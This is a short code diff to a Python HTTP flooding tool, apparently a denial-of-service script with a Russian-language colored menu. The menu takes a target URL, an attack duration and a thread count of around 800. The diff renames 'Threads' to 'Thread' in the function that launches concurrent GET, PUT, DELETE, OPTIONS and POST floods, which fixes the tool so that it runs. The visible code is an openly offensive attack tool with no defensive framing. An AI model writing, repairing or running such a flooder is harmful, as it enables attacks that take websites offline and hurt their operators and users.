@@ -72,7 +72,7 @@ def menu2():
 global url, time, file
 url     =     input(f'{Fore.LIGHTGREEN_EX}╰─────| ССЫЛКА URL |───> {Fore.BLUE}')
 print(f'')
-time    = int(input(f'{Fore.LIGHTGREEN_EX}╰─────| ВРЕМЯ TIMEING ATTACK |───> {Fore.BLUE} '))
+time    = int(input(f'{Fore.LIGHTGREEN_EX}╰─────| ВРЕМЯ TIMEING |───> {Fore.BLUE} '))
 print(f'')
 threads = int(input(f'{Fore.LIGHTGREEN_EX}╰─────| ПОТОКИ [800] THREAD |───> {Fore.BLUE}'))
 print('')
@@ -108,11 +108,11 @@ def attack(request):
 def createThreadings():
 	global breakFlag
 	try:
-		Threads(target=lambda: attack("get")).start()
-		Threads(target=lambda: attack("put")).start()
-		Threads(target=lambda: attack("delete")).start()
-		Threads(target=lambda: attack("options")).start()
-		Threads(target=lambda: attack("post")).start()
+		Thread(target=lambda: attack("get")).start()
+		Thread(target=lambda: attack("put")).start()
+		Thread(target=lambda: attack("delete")).start()
+		Thread(target=lambda: attack("options")).start()
+		Thread(target=lambda: attack("post")).start()
 	except:
 		breakFlag = True
 
